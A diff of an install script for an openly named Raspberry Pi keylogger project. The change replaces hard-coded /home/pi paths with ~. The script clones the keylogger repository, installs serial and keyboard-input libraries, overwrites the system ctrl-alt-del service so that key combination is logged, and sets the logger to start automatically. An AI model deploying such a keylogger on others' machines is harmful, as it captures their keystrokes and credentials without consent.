@@ -3,10 +3,10 @@ echo "Installing git and pip"
 apt install git pip -y # Installing git for next step and pip for python libraries
 
 echo "Downloading and extracting repository"
-git clone https://github.com/apacelus/Pi-Keylogger --branch=master /home/pi/Pi-Keylogger # Cloning the repository to a new directory
+git clone https://github.com/apacelus/Pi-Keylogger --branch=master ~/Pi-Keylogger # Cloning the repository to a new directory
 
 echo "Creating log directory"
-mkdir /home/pi/Pi-Keylogger/log # Creating log directory
+mkdir ~/Pi-Keylogger/log # Creating log directory
 
 echo "Downloading additional python libraries"
 pip download getch pyserial
@@ -15,8 +15,8 @@ echo "Installing additional python libraries"
 pip install ./getch* ./pyserial*
 
 echo "Replacing cad service"
-cp -f /home/pi/Pi-Keylogger/handlecad.service /etc/systemd/system/ # Overwriting default system handler to be able to keylog the "ctrl+alt+delete" combination.
-cp -f /home/pi/Pi-Keylogger/ctrl-alt-del.target /lib/systemd/system/ # Not sure yet what this is for
+cp -f ~/Pi-Keylogger/handlecad.service /etc/systemd/system/ # Overwriting default system handler to be able to keylog the "ctrl+alt+delete" combination.
+cp -f ~/Pi-Keylogger/ctrl-alt-del.target /lib/systemd/system/ # Not sure yet what this is for
 systemctl daemon-reload # Reload systemd manager configuration
 
 echo "Enabling auto-execution of the script"
